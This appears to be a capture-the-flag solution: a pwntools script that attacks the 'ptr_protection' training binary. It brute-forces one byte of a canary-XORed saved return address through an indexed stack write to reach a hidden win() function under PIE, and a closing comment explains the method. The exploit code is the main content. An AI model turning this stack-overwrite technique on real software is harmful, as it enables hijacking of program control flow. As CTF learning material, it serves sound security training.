from pwn import *
from sys import *
from random import *

SERVER = "bin.training.offdef.it"
PORT = "4202"
BINARY = "./ptr_protection"
       

#code

if "--debug" in sys.argv: 
    r = process(BINARY)
    gdb.attach(r, """
        #breakpoints
        b get_int
        c
        """)
    input("wait")

   

else:    
    print("Starting guessing...")
    counter =0
    while(True):
        counter +=1
        if "--remote" in sys.argv:
            r = remote(SERVER, PORT)
        else:
            r = process(BINARY)
            if "--debug" in sys.argv: 
                gdb.attach(r, """
                    #breakpoints
                    b get_int
                    c
                    """)
                input("wait")

        r.sendline(b"40") #40 is the index, beacause of the offset to the last byte of the saved IP
        r.sendline(b"232") #232 is the byte \xie, the one who never change
        r.sendline(b"41") #41 is the index of the penultimo byte
        r.sendline(p64(randint(0,255))) #the guess
        r.sendline(b'-1')

        sleep(0.3) #needed to not corrupt the buffer in remote
        bytes = r.recv()

        if( b"WIN!" in bytes):
            print("FOUND FLAG in ", counter," attempts")
            print(bytes)
            break

        if "--remote" in sys.argv:
            r.close()
        else:
            r.kill()

'''
this challenge was a pain in the ass because it works as a guess and check. It tooks me two days
to understand the only way I could resolve it was with a bruteforce script. Basically with ghidra 
I found a hidden function (never executed by binary) called win(), able to open the flag. So the goal
was to make the challenge() jump to the win addr without overwriting the canary. The function
get_int() had no vulnerabilities so the only way to overwrite the stack was by using the challenge() function. 
You could write in the position you wanted by setting the correct index. 

What to write was the real problem because the PIE was enabled so the win addr always change in every run. 
In addiction, there was somenthing strange with the saved IP addr, because during the execution there was no way
to read a valid instruction pointer. After a while I understood that the saved IP was xored with the canary. So, 
the only way to exploit it was to understand which addr was. The most significant bytes could be ingnored because 
at each run they change accordly to the .text addr, the last one was the one printable (because the last byte of
the canary is \x00), so basically the only one to guess was the penultimo. 

If you try it remotly it works, for some reason locally it doesn't
'''
    


